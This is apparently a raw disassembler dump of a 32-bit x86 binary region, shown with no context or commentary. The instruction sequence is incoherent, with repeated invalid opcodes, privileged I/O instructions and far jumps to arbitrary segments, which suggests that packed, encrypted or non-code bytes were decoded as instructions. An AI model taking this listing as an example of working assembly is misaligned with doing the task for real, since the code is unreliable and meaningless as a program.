  40c549:	lock push cs
  40c54b:	mov    ds:0x25af5256,eax
  40c550:	fnstenv ds:0xca0c0936
  40c556:	inc    ebx
  40c557:	pop    ecx
  40c558:	and    al,0x7c
  40c55a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c55b:	cvtdq2ps xmm4,XMMWORD PTR [ebx+edx*1-0x6344be3b]
  40c563:	ret    0xc33d
  40c566:	call   DWORD PTR [ebp-0x7494536c]
  40c56c:	ret    0x5c13
  40c56f:	aas    
  40c570:	ja     0x40c515
  40c572:	or     edi,0xffffffe3
  40c575:	ja     0x40c501
  40c577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c578:	ret    
  40c579:	mov    di,0xb6fb
  40c57d:	clc    
  40c57e:	js     0x40c5d6
  40c580:	loop   0x40c5f1
  40c582:	aas    
  40c583:	dec    edx
  40c584:	jae    0x40c567
  40c586:	addr16 nop
  40c588:	mov    dh,0xb5
  40c58a:	sbb    eax,0x6a8c4eae
  40c58f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c590:	repnz push ds
  40c592:	sbb    BYTE PTR [edx],ah
  40c594:	jnp    0x40c5c2
  40c596:	rol    BYTE PTR ds:0xd1e9e692,cl
  40c59c:	xor    esp,DWORD PTR [ecx+0x1946ed12]
  40c5a2:	pop    es
  40c5a3:	test   dh,cl
  40c5a5:	xchg   esp,eax
  40c5a6:	add    BYTE PTR [eax+0xb],al
  40c5a9:	je     0x40c561
  40c5ab:	xlat   BYTE PTR ds:[ebx]
  40c5ac:	bound  edx,QWORD PTR [esi-0x19]
  40c5af:	ror    DWORD PTR [ebp-0x73],0xbb
  40c5b3:	in     al,dx
  40c5b4:	stc    
  40c5b5:	test   eax,0x68bef656
  40c5ba:	dec    ebx
  40c5bb:	jae    0x40c5ef
  40c5bd:	xchg   esi,eax
  40c5be:	adc    edx,DWORD PTR ds:0xcd1a8133
  40c5c4:	(bad)  
  40c5c6:	xor    DWORD PTR [esi+0x1af7fea4],edx
  40c5cc:	mov    esi,0x7d0d49cd
  40c5d1:	push   ebp
  40c5d2:	and    esp,ebp
  40c5d4:	pop    esp
  40c5d5:	ins    DWORD PTR es:[edi],dx
  40c5d6:	jne    0x40c57c
  40c5d8:	adc    esi,DWORD PTR [edi+esi*2+0x27d39eab]
  40c5df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5e0:	sub    ah,BYTE PTR [ebp-0x29]
  40c5e3:	mov    WORD PTR [eax+0x24],bp
  40c5e7:	mov    al,ds:0x46164dd0
  40c5ec:	inc    edi
  40c5ed:	cmp    dh,bh
  40c5ef:	xchg   DWORD PTR [eax+eax*2],ebp
  40c5f2:	fnstcw WORD PTR [esp+ecx*4-0xa]
  40c5f6:	and    DWORD PTR [eax-0x11],ecx
  40c5f9:	adc    DWORD PTR [esp+ecx*2-0x6a393e97],0x53f5f158
  40c604:	mov    ch,0x28
  40c606:	lods   al,BYTE PTR ds:[esi]
  40c607:	clc    
  40c608:	mov    bl,0xd
  40c60a:	neg    DWORD PTR [esi-0x6a]
  40c60d:	aaa    
  40c60e:	rcr    DWORD PTR [eax],1
  40c610:	or     al,0x87
  40c612:	in     al,dx
  40c613:	call   0xbe52e0b5
  40c618:	or     eax,0xb3624cda
  40c61d:	sub    esp,DWORD PTR [ebx-0x27]
  40c620:	add    al,BYTE PTR [esi+ecx*4]
  40c623:	popf   
  40c624:	inc    esi
  40c625:	outs   dx,BYTE PTR es:[esi]
  40c627:	jo     0x40c629
  40c629:	adc    DWORD PTR [ebp+eax*4-0x5b2f786c],esi
  40c630:	or     DWORD PTR [esi+0x71499d8],0x3caae097
  40c63a:	fadd   DWORD PTR [edx]
  40c63c:	das    
  40c63d:	daa    
  40c63e:	xchg   edx,eax
  40c63f:	popf   
  40c640:	mov    eax,0x4e41ae8c
  40c645:	es int 0xfc
  40c648:	pop    ecx
  40c649:	sbb    dl,BYTE PTR [esi]
  40c64b:	sbb    al,BYTE PTR [edx]
  40c64d:	sbb    cl,0x85
  40c650:	(bad)  
  40c651:	adc    BYTE PTR ds:0x4c646f5e,dh
  40c657:	cmp    ah,al
  40c659:	jp     0x40c600
  40c65b:	cmp    bl,BYTE PTR [edx-0x3d65ed79]
  40c661:	imul   ecx,ecx,0xffffffb9
  40c664:	in     eax,dx
  40c665:	fistp  WORD PTR [ecx]
  40c667:	push   ebx
  40c668:	xchg   BYTE PTR [ebx+0x26],bl
  40c66b:	adc    edx,DWORD PTR [ecx+ebp*1-0x700b1dfe]
  40c672:	fs pusha 
  40c674:	add    ebx,DWORD PTR [eax+ebx*2+0x6afe0300]
  40c67b:	imul   edi,DWORD PTR cs:[ecx],0x67983566
  40c682:	nop
  40c683:	and    ecx,DWORD PTR [ecx-0x7aff6bea]
  40c689:	icebp  
  40c68a:	mov    dl,0x2d
  40c68c:	xchg   ecx,eax
  40c68d:	ins    DWORD PTR es:[edi],dx
  40c68e:	add    BYTE PTR [edi-0x36eaa332],0x69
  40c695:	pop    esp
  40c696:	fldcw  WORD PTR [ecx+0x1f]
  40c699:	cli    
  40c69a:	sahf   
  40c69b:	(bad)  
  40c69c:	popf   
  40c69d:	pop    ds
  40c69e:	xchg   edi,eax
  40c69f:	cdq    
  40c6a0:	add    DWORD PTR [edx+0x42],0x79
  40c6a4:	sbb    bh,dh
  40c6a6:	fstp   TBYTE PTR [esp+edi*1-0x5f82f154]
  40c6ad:	mov    ds:0xa8f9b0cc,eax
  40c6b2:	enter  0xc40e,0xc4
  40c6b6:	pop    edi
  40c6b7:	pushf  
  40c6b8:	test   DWORD PTR [edi+0x21],ecx
  40c6bb:	shr    DWORD PTR [esi],0x92
  40c6be:	mov    dh,0x97
  40c6c0:	adc    DWORD PTR ds:0x57bd2182,esi
  40c6c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6c7:	aad    0xe6
  40c6c9:	push   ss
  40c6ca:	add    dl,BYTE PTR [ebp-0x17fc8e77]
  40c6d0:	mov    cl,0x4b
  40c6d2:	dec    ebx
  40c6d3:	fstp   DWORD PTR [eax-0x5f]
  40c6d6:	fstp   TBYTE PTR [ebx+0x22]
  40c6d9:	clc    
  40c6da:	dec    edx
  40c6db:	dec    BYTE PTR [edi]
  40c6dd:	inc    ecx
  40c6de:	mov    edx,0x394cc209
  40c6e3:	xchg   esi,eax
  40c6e4:	sahf   
  40c6e5:	lahf   
  40c6e6:	test   DWORD PTR [ecx+0x58],0x1a30ed6e
  40c6ed:	mov    dl,0x72
  40c6ef:	and    al,0x5b
  40c6f1:	outs   dx,DWORD PTR ds:[esi]
  40c6f2:	aam    0x61
  40c6f4:	cmp    esi,DWORD PTR [edi-0x62]
  40c6f7:	jle    0x40c754
  40c6f9:	scas   al,BYTE PTR es:[edi]
  40c6fa:	outs   dx,DWORD PTR ds:[esi]
  40c6fb:	aad    0x8f
  40c6fd:	inc    esi
  40c6fe:	adc    al,0x89
  40c700:	jmp    0xc9aa:0xec53c48a
  40c707:	mov    eax,ds:0x90a8f7a5
  40c70c:	and    ch,BYTE PTR [edi+eax*2+0x63ec3bfb]
  40c713:	in     al,dx
  40c714:	mov    ds:0x65de0a8e,al
  40c719:	xchg   BYTE PTR [esi-0x3911e2f6],ch
  40c71f:	in     eax,0x1c
  40c721:	sbb    eax,0x6add3067
  40c726:	sbb    al,0xbf
  40c728:	daa    
  40c729:	dec    esi
  40c72a:	dec    ebx
  40c72b:	dec    esp
  40c72c:	pusha  
  40c72d:	rcl    DWORD PTR [ecx+0x28],0x47
  40c731:	add    DWORD PTR [ebp-0x41527874],0xffffffd7
  40c738:	fcomp  DWORD PTR [ecx]
  40c73a:	inc    eax
  40c73b:	(bad)  
  40c73d:	cli    
  40c73e:	repz (bad) 
  40c741:	and    BYTE PTR [eax],dh
  40c743:	fmul   DWORD PTR [ebx-0x47832e6e]
  40c749:	adc    dh,BYTE PTR [eax+0x46]
  40c74c:	adc    edx,DWORD PTR [edi]
  40c74e:	aas    
  40c74f:	call   0x2fea:0x3f51bf3b
  40c756:	cli    
  40c757:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c758:	jecxz  0x40c6f9
  40c75a:	lahf   
  40c75b:	jns    0x40c6f0
  40c75d:	xor    al,0x49
  40c75f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c760:	sbb    eax,0x51dd0820
  40c765:	push   esi
  40c766:	xchg   edx,esi
  40c768:	inc    ebx
  40c769:	xor    al,0x30
  40c76b:	imul   edi,DWORD PTR [edi+esi*2],0x66ee0963
  40c772:	or     al,0x5
  40c774:	pop    es
  40c775:	push   ecx
  40c776:	test   al,0xf5
  40c778:	sub    DWORD PTR [ecx],ebx
  40c77a:	push   esi
  40c77b:	inc    ecx
  40c77c:	cmp    DWORD PTR [eax],0xf738353
  40c782:	pop    ds
  40c783:	pushf  
  40c784:	out    0xd9,al
  40c786:	push   ebp
  40c787:	xchg   ch,ch
  40c789:	jle    0x40c778
  40c78b:	nop
  40c78c:	mov    al,ds:0xeb28d76c
  40c791:	and    cl,BYTE PTR [edi]
  40c793:	mov    ds:0x22dcc36f,eax
  40c798:	stos   BYTE PTR es:[edi],al
  40c799:	add    DWORD PTR [ebp-0x22],ebx
  40c79c:	cmp    eax,DWORD PTR [edi]
  40c79e:	jmp    0x9d8a:0x4f210f9e
  40c7a5:	fsub   QWORD PTR [edi-0x1f]
  40c7a8:	into   
  40c7a9:	(bad)  
  40c7aa:	test   ah,0x6c
  40c7ad:	inc    esi
  40c7ae:	out    dx,eax
  40c7af:	inc    eax
  40c7b0:	sub    al,0xda
  40c7b2:	or     ah,BYTE PTR ds:[esi-0x6e68d6b1]
  40c7b9:	rol    ebp,1
  40c7bb:	(bad)  
  40c7bc:	sub    eax,0x30f8d51f
  40c7c1:	push   edi
  40c7c2:	repz fld QWORD PTR [eax]
  40c7c5:	dec    ecx
  40c7c6:	imul   ebp,DWORD PTR [edx-0x171d5d57],0x48
  40c7cd:	test   ch,cl
  40c7cf:	jecxz  0x40c784
  40c7d1:	repz and al,BYTE PTR [eax+0x18]
  40c7d5:	sub    esp,edi
  40c7d7:	and    al,0xe7
  40c7d9:	stos   DWORD PTR es:[edi],eax
  40c7da:	scas   al,BYTE PTR es:[edi]
  40c7db:	loop   0x40c7ba
  40c7dd:	or     ah,ah
  40c7df:	ss xchg esp,eax
  40c7e1:	test   BYTE PTR [esi],dl
  40c7e3:	mov    edi,0x55dd8a1c
  40c7e8:	les    esp,FWORD PTR [ecx-0x2fb306ae]
  40c7ee:	push   ss
  40c7ef:	les    esi,FWORD PTR [edx-0x33]
  40c7f2:	stos   BYTE PTR es:[edi],al
  40c7f3:	adc    dl,al
  40c7f5:	cmp    eax,0x91cd187c
  40c7fa:	and    BYTE PTR [ebp+0x38a89916],0xd2
  40c801:	xor    eax,0x2f2e4fef
  40c806:	xchg   esi,eax
  40c807:	dec    esi
  40c808:	je     0x40c7e2
  40c80a:	mov    ah,ch
  40c80c:	mov    bh,0xca
  40c80e:	adc    cl,BYTE PTR [edi]
  40c810:	ins    DWORD PTR es:[edi],dx
  40c811:	push   ebp
  40c812:	pop    edx
  40c813:	fmul   QWORD PTR [ecx+0x7a6baf36]
  40c819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c81a:	jmp    0xa835:0x17d1a09b
  40c821:	push   esi
  40c822:	adc    BYTE PTR [edi+0x11],al
  40c825:	xchg   BYTE PTR [esi+0x18ffa635],cl
  40c82b:	pop    edx
  40c82c:	xchg   edx,eax
  40c82d:	call   0x735e:0xa9dfe137
  40c834:	call   0xa793:0xed8b8c47
  40c83b:	push   ebx
  40c83c:	mov    ebp,0x88367075
  40c841:	adc    al,bh
  40c843:	stos   BYTE PTR es:[edi],al
  40c844:	shr    DWORD PTR [edx],1
  40c846:	psrlw  mm3,QWORD PTR [edx]
  40c849:	push   edx
  40c84a:	and    BYTE PTR [edi+0x437cd6e0],0xfe
  40c851:	repnz arpl WORD PTR [ebp-0x57],dx
  40c855:	sub    al,BYTE PTR [edi-0x168e4047]
  40c85b:	push   edx
  40c85c:	jp     0x40c89d
  40c85e:	test   eax,0xa86d8215
  40c863:	rcr    DWORD PTR [esi+0x3d],1
  40c866:	xchg   BYTE PTR [ebp+eiz*2+0x70915483],bh
  40c86d:	ins    DWORD PTR es:[edi],dx
  40c86e:	out    dx,eax
  40c86f:	push   0xffffffee
  40c871:	cmp    al,0x3e
  40c873:	jmp    0xab9e:0xaba30d86
  40c87a:	dec    edx
  40c87b:	(bad)  [eax+eiz*2]
  40c87e:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40c880:	je     0x40c857
  40c882:	sub    ebx,edx
  40c884:	sub    edx,0xb1748e13
  40c88a:	jmp    0xa839cde5
  40c88f:	stos   BYTE PTR es:[edi],al
  40c890:	test   eax,0xf5e9e0b2
  40c895:	push   0x1611fdbb
  40c89a:	add    bh,bh
  40c89c:	push   edx
  40c89d:	jg     0x40c884
  40c89f:	outs   dx,DWORD PTR ds:[esi]
  40c8a0:	mov    esi,edi
  40c8a2:	xlat   BYTE PTR ds:[ebx]
  40c8a3:	sub    bh,BYTE PTR [edx+0x721fc8e6]
  40c8a9:	arpl   WORD PTR [edi-0x5603a520],sp
  40c8af:	call   0xfc7ea2bb
  40c8b4:	xchg   ebp,eax
  40c8b5:	pop    ebx
  40c8b6:	add    BYTE PTR [ebx+0x71],0x28
  40c8ba:	jno    0x40c856
  40c8bc:	test   DWORD PTR [ebx],0xcd1c5aa2
  40c8c2:	jecxz  0x40c879
  40c8c4:	push   ebp
  40c8c5:	(bad)  
  40c8c6:	jle    0x40c861
  40c8c8:	es test eax,0xd483d479
  40c8ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8cf:	rcr    DWORD PTR [edx+0x5d],0xa
  40c8d3:	inc    esi
  40c8d4:	int3   
  40c8d5:	retf   
  40c8d6:	ins    DWORD PTR es:[edi],dx
  40c8d7:	inc    esp
  40c8d8:	or     al,0x46
  40c8da:	adc    eax,0x45540cd0
  40c8df:	add    bh,BYTE PTR [ebx+0x30]
  40c8e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8e3:	lds    ecx,FWORD PTR [edx]
  40c8e5:	jb     0x40c884
  40c8e7:	fld    QWORD PTR ds:0x11e6270e
  40c8ed:	retf   0xa790
  40c8f0:	nop
  40c8f1:	and    eax,0x8f8fdec
  40c8f6:	test   BYTE PTR [ecx],cl
  40c8f8:	test   ecx,ebp
  40c8fa:	loopne 0x40c919
  40c8fc:	repnz sti 
  40c8fe:	pop    DWORD PTR [ebx+0x4ad69cba]
  40c904:	scas   al,BYTE PTR es:[edi]
  40c905:	jbe    0x40c92d
  40c907:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c908:	mov    esi,esi
  40c90a:	pop    esi
  40c90b:	xchg   esi,ebx
  40c90d:	jmp    0x40c8ed
  40c90f:	pop    ds
  40c910:	or     DWORD PTR [eax+0xe],esi
  40c913:	xchg   dh,ah
  40c915:	rol    DWORD PTR ds:0x7f8e4305,0x66
  40c91c:	jmp    0x74bbd330
  40c921:	shr    BYTE PTR [ebp+0x56f0e076],1
  40c927:	arpl   WORD PTR [esi+0x62],bp
  40c92a:	sub    al,BYTE PTR [ecx-0x2b]
  40c92d:	push   ebx
  40c92e:	(bad)  
  40c92f:	leave  
  40c930:	lods   al,BYTE PTR ds:[esi]
  40c931:	pop    ebx
  40c932:	xabort 0x7f
  40c935:	pop    ebp
  40c936:	leave  
  40c937:	pop    edi
  40c938:	inc    ecx
  40c939:	jne    0x40c8e1
  40c93b:	fistp  QWORD PTR [edx-0x15]
  40c93e:	mov    dh,BYTE PTR [ecx]
  40c940:	lahf   
  40c941:	inc    edi
  40c942:	out    dx,eax
  40c943:	adc    eax,DWORD PTR [esi+0x222ebb78]
  40c949:	mov    ah,0xec
  40c94b:	pusha  
  40c94c:	add    eax,DWORD PTR [edx+0x51]
  40c94f:	sbb    ebx,DWORD PTR [esi]
  40c951:	std    
  40c952:	stos   BYTE PTR es:[edi],al
  40c953:	outs   dx,DWORD PTR ds:[esi]
  40c954:	sbb    bh,ch
  40c956:	aam    0xe9
  40c958:	mov    eax,ds:0xc432b7c6
  40c95d:	fnstenv [ecx-0x37]
  40c960:	jecxz  0x40c950
  40c962:	ss retf 0xc1e0
  40c966:	cmp    al,0xc5
  40c968:	cmp    DWORD PTR [ecx],0xce986d56
  40c96e:	call   0x2ad3:0x687e55bc
  40c975:	or     DWORD PTR [esi-0x69bad7f6],ebx
  40c97b:	mov    cl,0x7d
  40c97d:	adc    eax,0x908f8975
  40c982:	in     eax,0xf9
  40c984:	fwait
  40c985:	mov    ch,0x37
  40c987:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c988:	je     0x40c956
  40c98a:	aam    0xa
  40c98c:	(bad)  
  40c98d:	sbb    dl,BYTE PTR [ebx-0xa]
  40c990:	std    
  40c991:	or     eax,0xa6bd0200
  40c996:	mov    ch,0x1f
  40c998:	inc    esi
  40c999:	add    eax,0x824df454
  40c99e:	or     dh,BYTE PTR [ecx]
  40c9a0:	xchg   esp,eax
  40c9a1:	lods   al,BYTE PTR ds:[esi]
  40c9a2:	sub    ecx,esi
  40c9a4:	jecxz  0x40ca09
  40c9a6:	mov    ds:0x73861641,eax
  40c9ab:	mov    bl,0x5b
  40c9ad:	dec    ebp
  40c9ae:	sbb    BYTE PTR [ebp-0x7a6ccfb],dl
  40c9b4:	inc    esi
  40c9b5:	sbb    BYTE PTR [ecx+0x7faca9b8],cl
  40c9bb:	and    ah,0x6a
  40c9be:	xor    eax,0xca993ac4
  40c9c3:	aam    0x90
  40c9c5:	(bad)  
  40c9c7:	dec    edi
  40c9c8:	(bad)  
  40c9c9:	cs aad 0x34
  40c9cc:	ja     0x40c97a
  40c9ce:	leave  
  40c9cf:	pop    eax
  40c9d0:	scas   al,BYTE PTR es:[edi]
  40c9d1:	mov    DWORD PTR [eax-0x7d],ebp
  40c9d4:	xor    ebp,ecx
  40c9d6:	lock gs cmc 
  40c9d9:	ror    DWORD PTR [ebx],cl
  40c9db:	pop    esp
  40c9dc:	pop    esi
  40c9dd:	dec    ecx
  40c9de:	dec    ecx
  40c9e0:	dec    ebx
  40c9e1:	pop    esp
  40c9e2:	xlat   BYTE PTR ds:[ebx]
  40c9e3:	mov    ah,0xc5
  40c9e5:	pop    edi
  40c9e6:	mov    ds:0xe6ff4373,eax
  40c9eb:	dec    ebp
  40c9ec:	mov    eax,ds:0xe0cd449b
  40c9f1:	mov    dl,0xc0
  40c9f3:	lahf   
  40c9f4:	lds    ebx,FWORD PTR [edi-0x5906a2eb]
  40c9fa:	fld    TBYTE PTR [edx-0x1d]
  40c9fd:	out    dx,al
  40c9fe:	call   0x4b608c15
  40ca03:	imul   esp,DWORD PTR [edx-0x1c06b1fb],0x14bc4ee
  40ca0d:	ins    DWORD PTR es:[edi],dx
  40ca0e:	shl    al,0x72
  40ca11:	push   esp
  40ca12:	jmp    0x2ec993f
  40ca17:	lock stos BYTE PTR es:[edi],al
  40ca19:	xlat   BYTE PTR ds:[ebx]
  40ca1a:	loop   0x40ca8d
  40ca1c:	xlat   BYTE PTR ds:[ebx]
  40ca1d:	dec    ebx
  40ca1e:	retf   
  40ca1f:	inc    ecx
  40ca20:	jno    0x40ca12
  40ca22:	fcomp  QWORD PTR [edx+0x44dacce4]
  40ca28:	inc    esp
  40ca29:	iret   
  40ca2a:	std    
  40ca2b:	dec    edi
  40ca2c:	sub    al,0x39
  40ca2e:	mov    ds:0x6a90a079,al
  40ca33:	push   esi
  40ca34:	les    ecx,FWORD PTR [eax-0x59]
  40ca37:	(bad)  
  40ca38:	jo     0x40ca39
  40ca3a:	jge    0x40caa6
  40ca3c:	dec    ebx
  40ca3d:	jne    0x40ca48
  40ca3f:	pop    ss
  40ca40:	inc    BYTE PTR [eax+eiz*2+0x1b]
  40ca44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca45:	mov    ah,0x67
  40ca47:	dec    edx
  40ca48:	scas   eax,DWORD PTR es:[edi]
  40ca49:	not    cl
  40ca4b:	data16 test cl,ah
  40ca4e:	and    al,BYTE PTR [esi-0x72]
  40ca51:	imul   ebp,DWORD PTR [bx+0x6],0xffffffc2
  40ca56:	bound  esi,QWORD PTR [eax+ecx*2+0x6d]
  40ca5a:	sub    eax,0xb7acaba1
  40ca5f:	test   eax,edx
  40ca61:	(bad)  
  40ca62:	mov    DWORD PTR ds:0x5374284a,edx
  40ca68:	jns    0x40ca42
  40ca6a:	test   al,0x76
  40ca6c:	pop    esp
  40ca6d:	vpsraw ymm2,ymm6,XMMWORD PTR [edx-0x92c6af2]
  40ca75:	jne    0x40ca38
  40ca77:	mov    dh,0x26
  40ca79:	push   edi
  40ca7a:	xor    eax,0xd243ed31
  40ca7f:	lods   eax,DWORD PTR ds:[esi]
  40ca80:	mov    ebx,0x4ae47146
  40ca85:	js     0x40ca4f
  40ca87:	sbb    al,0xb
  40ca89:	ud0    esi,DWORD PTR [eax-0x7b0f57dd]
  40ca90:	xor    ecx,DWORD PTR [ecx]
  40ca92:	ins    DWORD PTR es:[edi],dx
  40ca93:	ret    
  40ca94:	mov    esi,0x4611ad69
  40ca99:	lds    esp,FWORD PTR [ebx+0x610b55e7]
  40ca9f:	dec    esp
  40caa0:	pmullw mm1,QWORD PTR [esi+edi*1-0x2d]
  40caa5:	adc    eax,0xada670b5
  40caaa:	retf   0xbe17
  40caad:	loopne 0x40cac6
  40caaf:	xchg   ecx,eax
  40cab0:	pop    ebx
  40cab1:	sub    dh,cl
  40cab3:	out    0x6c,eax
  40cab5:	addr16 ret 
  40cab7:	out    dx,al
  40cab8:	mov    ecx,0x68750396
  40cabd:	inc    ecx
  40cabe:	xor    al,0x5c
  40cac0:	xlat   BYTE PTR ds:[ebx]
  40cac1:	push   edi
  40cac2:	jae    0x40cb24
  40cac4:	xor    eax,0x7566b102
  40cac9:	mov    dh,0x15
  40cacb:	pop    ebp
  40cacc:	and    BYTE PTR [ebx+eiz*4+0x70],0x9f
  40cad1:	dec    ebp
  40cad2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cad3:	ror    DWORD PTR [eax+0x2],cl
  40cad6:	sbb    sp,ax
  40cad9:	ret    
  40cada:	lods   eax,DWORD PTR ds:[esi]
  40cadb:	mov    cl,0x92
  40cadd:	mov    dh,0x1d
  40cadf:	and    BYTE PTR [ecx+0x5029c7ae],0x99
  40cae6:	or     DWORD PTR [ebp+0x1b21cbcb],0x58a4bdd8
  40caf0:	ins    BYTE PTR es:[edi],dx
  40caf1:	inc    esp
  40caf2:	and    BYTE PTR [esp+eax*2-0x7e16b935],bl
  40caf9:	dec    ebx
  40cafa:	jae    0x40cb3f
  40cafc:	je     0x40cb7c
  40cafe:	scas   eax,DWORD PTR es:[edi]
  40caff:	fadd   st,st(0)
  40cb01:	retf   
  40cb02:	push   ecx
  40cb03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb04:	ja     0x40caba
  40cb06:	in     al,dx
  40cb07:	repnz mov eax,0x2b53e489
  40cb0d:	xor    edx,DWORD PTR [esi]
  40cb0f:	fcmovnb st,st(1)
  40cb11:	xchg   edi,eax
  40cb12:	cmp    ecx,ecx
  40cb14:	push   cs
  40cb15:	push   ebp
  40cb16:	cld    
  40cb17:	inc    ebx
  40cb18:	mov    esp,DWORD PTR [esi-0x6377a4cc]
  40cb1e:	loop   0x40cab1
  40cb20:	mov    ebx,0x62d47b97
  40cb25:	imul   eax,DWORD PTR [eax+0x43a8ff7c],0x58
  40cb2c:	xchg   edi,eax
  40cb2d:	(bad)  
  40cb2f:	int3   
  40cb30:	inc    esp
  40cb31:	dec    eax
  40cb33:	xchg   DWORD PTR [edi+0xc],edi
  40cb36:	dec    edx
  40cb37:	xchg   BYTE PTR [ecx-0x5],bl
  40cb3a:	cmp    BYTE PTR [ebx+0x1ff87ef4],0xd2
  40cb41:	lea    ebx,[esi+0xdd13a2]
  40cb47:	shr    DWORD PTR [eax-0x4919472a],cl
  40cb4d:	ret    
  40cb4e:	test   DWORD PTR [eax-0x36],0xa5eb408d
  40cb55:	bound  esi,QWORD PTR [edi-0x36e12828]
  40cb5b:	dec    edx
  40cb5c:	fwait
  40cb5d:	pop    ebp
  40cb5e:	mov    WORD PTR [esi],?
  40cb60:	adc    bl,al
  40cb62:	inc    ecx
  40cb63:	push   ebx
  40cb64:	mov    dl,0xbe
  40cb66:	xchg   ebp,eax
  40cb67:	adc    al,al
  40cb69:	push   esi
  40cb6a:	sub    BYTE PTR [edi+0x1d],dl
  40cb6d:	scas   eax,DWORD PTR es:[edi]
  40cb6e:	xchg   edx,eax
  40cb6f:	icebp  
  40cb70:	add    eax,0x9835181c
  40cb75:	fisubr WORD PTR [esi+0x68]
  40cb78:	rcr    DWORD PTR [eax],1
  40cb7a:	or     eax,0xd5724d97
  40cb7f:	pop    esp
  40cb80:	jne    0x40cbcf
  40cb82:	and    edx,DWORD PTR [eax]
  40cb84:	or     eax,0xc317845c
  40cb89:	inc    esi
  40cb8a:	arpl   cx,bp
  40cb8c:	cmp    ebx,DWORD PTR [edx]
  40cb8e:	add    eax,0x35116aad
  40cb93:	pop    ds
  40cb94:	sbb    cl,BYTE PTR [esi]
  40cb96:	scas   eax,DWORD PTR es:[edi]
  40cb97:	test   DWORD PTR [esi-0x14],edx
  40cb9a:	call   DWORD PTR [eax-0x7c]
  40cb9d:	pop    ebp
  40cb9e:	or     eax,0xa89884e4
  40cba3:	pop    ss
  40cba4:	pushf  
  40cba5:	xor    ecx,eax
  40cba7:	jo     0x40cbbd
  40cba9:	sahf   
  40cbaa:	js     0x40cc27
  40cbac:	in     eax,0x8c
  40cbae:	lods   al,BYTE PTR ds:[esi]
  40cbaf:	scas   eax,DWORD PTR es:[edi]
  40cbb0:	xor    BYTE PTR [eax-0x4fe75f7],ch
  40cbb6:	cdq    
  40cbb7:	into   
  40cbb8:	out    0x3a,eax
  40cbba:	or     al,0xc5
  40cbbc:	rol    bh,1
  40cbbe:	sub    ebp,esi
  40cbc0:	psrld  mm7,QWORD PTR [ecx-0x5b]
  40cbc4:	sub    dl,cl
  40cbc6:	shl    DWORD PTR [eax+ebp*8-0x7899bd8f],cl
  40cbcd:	xor    eax,0x1eab9c3c
  40cbd2:	or     eax,0x8b592d87
  40cbd7:	adc    ch,al
  40cbd9:	pop    ecx
  40cbda:	ins    BYTE PTR es:[edi],dx
  40cbdb:	test   al,0x89
  40cbdd:	test   BYTE PTR [ecx-0x54],ah
  40cbe0:	push   es
  40cbe1:	or     edx,ebx
  40cbe3:	cmc    
  40cbe4:	je     0x40cc43
  40cbe6:	inc    edx
  40cbe7:	retf   
  40cbe8:	ret    
  40cbe9:	sbb    edx,ecx
  40cbeb:	jno    0x40cc01
  40cbed:	clc    
  40cbee:	inc    ebp
  40cbef:	in     al,dx
  40cbf0:	fs leave 
  40cbf2:	jae    0x40cc64
  40cbf4:	push   edi
  40cbf5:	cmc    
  40cbf6:	add    eax,0x855de35a
  40cbfb:	ficomp DWORD PTR [eax*2-0x5960bb4f]
  40cc02:	lahf   
  40cc03:	add    edi,DWORD PTR [edx-0x59]
  40cc06:	retf   0xcc47
  40cc09:	cli    
  40cc0a:	gs push edi
  40cc0c:	in     eax,dx
  40cc0d:	rol    BYTE PTR [ecx],cl
  40cc0f:	fisub  WORD PTR [eax+0x6a79c07a]
  40cc15:	fiadd  WORD PTR [eax-0x49]
  40cc18:	in     al,0xe3
  40cc1a:	jno    0x40cbc8
  40cc1c:	and    DWORD PTR [edi-0x7bcf91a7],ebp
  40cc22:	pop    ebp
  40cc23:	or     ebx,esp
  40cc25:	mov    esp,0xf1dc0015
  40cc2a:	ja     0x40cc82
  40cc2c:	leave  
  40cc2d:	mov    ch,0xe4
  40cc2f:	mov    al,0xb4
  40cc31:	shl    DWORD PTR [edx+0x3a],cl
  40cc34:	sub    al,dh
  40cc36:	stos   BYTE PTR es:[edi],al
  40cc37:	cmp    ah,BYTE PTR [esi]
  40cc39:	dec    ebx
  40cc3a:	xchg   esi,eax
  40cc3b:	sets   BYTE PTR [ecx+edx*8]
  40cc3f:	gs mov ebx,0x400fec13
  40cc45:	and    eax,0x6961f671
  40cc4a:	xchg   dh,bl
  40cc4c:	xor    DWORD PTR [esi-0x7d791239],edx
  40cc52:	outs   dx,DWORD PTR ds:[esi]
  40cc53:	mov    bl,0xa6
  40cc55:	cmp    ah,BYTE PTR [eax+edx*4]
  40cc58:	adc    BYTE PTR [edi],bh
  40cc5a:	dec    esi
  40cc5b:	add    DWORD PTR [eax-0x7a87ac66],esp
  40cc61:	dec    edx
  40cc62:	add    DWORD PTR [ebx+0x7d],edi
  40cc65:	jmp    0x40cc8f
  40cc67:	mov    al,0x8b
  40cc69:	mov    es,edx
  40cc6b:	mov    al,ds:0x5b24e5bf
  40cc70:	loope  0x40ccd7
  40cc72:	addr16 push eax
  40cc74:	push   esp
  40cc75:	fsubr  QWORD PTR [eax+esi*1]
  40cc78:	int    0x6c
  40cc7a:	fidiv  WORD PTR [edx-0x7f]
  40cc7d:	sub    BYTE PTR [edi],ch
  40cc7f:	xchg   esp,eax
  40cc80:	nop
  40cc81:	pop    ebx
  40cc82:	std    
  40cc83:	jecxz  0x40cc55
  40cc85:	xor    esi,edx
  40cc87:	rol    DWORD PTR [ebx-0x5b9f8937],0x73
  40cc8e:	or     ecx,DWORD PTR [esi]
  40cc90:	xchg   esp,eax
  40cc91:	and    DWORD PTR [ebx],edi
  40cc93:	inc    esi
  40cc94:	cld    
